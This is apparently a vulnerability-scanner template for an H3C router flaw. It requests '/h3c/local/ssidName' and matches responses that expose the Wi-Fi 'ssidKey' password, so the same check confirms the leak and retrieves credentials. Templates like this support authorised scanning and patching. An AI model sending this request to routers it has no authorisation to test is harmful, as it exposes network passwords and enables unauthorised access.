id: poc-yaml-h3c-router-password-leakage
info:
  name: H3C Router Password Leakage Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: information-disclosure
http:
  - method: GET
    path:
      - "{{BaseURL}}/h3c/local/ssidName"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ssidName"
      - type: regex
        part: body
        regex:
          - "\\\"ssidKey\\\":\\s*\\\"[0-9a-zA-Z]+\\\""
      - type: word
        part: header
        words:
          - "application/json"
